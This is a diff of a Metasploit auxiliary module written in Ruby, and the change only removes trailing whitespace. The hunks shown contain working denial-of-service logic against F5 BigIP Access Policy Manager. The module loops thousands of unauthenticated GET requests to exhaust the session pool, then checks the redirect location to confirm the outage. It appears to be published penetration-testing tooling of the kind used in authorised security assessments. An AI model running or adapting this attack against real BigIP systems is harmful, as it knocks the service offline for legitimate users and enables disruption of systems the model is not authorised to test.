@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
         Since BigIP allocates a new session after the first unauthenticated request and deletes the session only if an access policy timeout will be expired
         the attacker can exhaust all available sessions repeatedly sending initial HTTP request.
       },
-      'Author'         => 
+      'Author'         =>
         [
          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
          'Nikita Oleksov <neoleksov[at]gmail.com>',
@@ -36,9 +36,9 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPort.new('RPORT', [true, 'The BigIP service port to listen on', 443]),
-        OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]),        
+        OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]),
         OptEnum.new('SSLVersion', [false, 'Specify the version of SSL/TLS that should be used', 'TLS1', ['SSL2', 'SSL3', 'TLS1']]),
-        OptString.new('TARGETURI', [true, 'The base path', '/']),       
+        OptString.new('TARGETURI', [true, 'The base path', '/']),
         OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000])
       ], self.class)
   end
@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
       end
 
     # Start attack
-      for i in 1..datastore['RLIMIT']      
+      for i in 1..datastore['RLIMIT']
         res = send_request_cgi('method' => 'GET', 'uri' => uri)
         if res and res.headers['Location'] == '/my.logout.php3?errorcode=14'
           print_status("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
         end
       end
 
-    # Check if attack is unsuccessfull    
+    # Check if attack is unsuccessfull
       res = send_request_cgi('method' => 'GET', 'uri' => uri)
       if res.headers['Location'] == '/my.policy'
         print_status("#{peer} - DoS attack is unsuccessful. Try to increase the RLIMIT number")
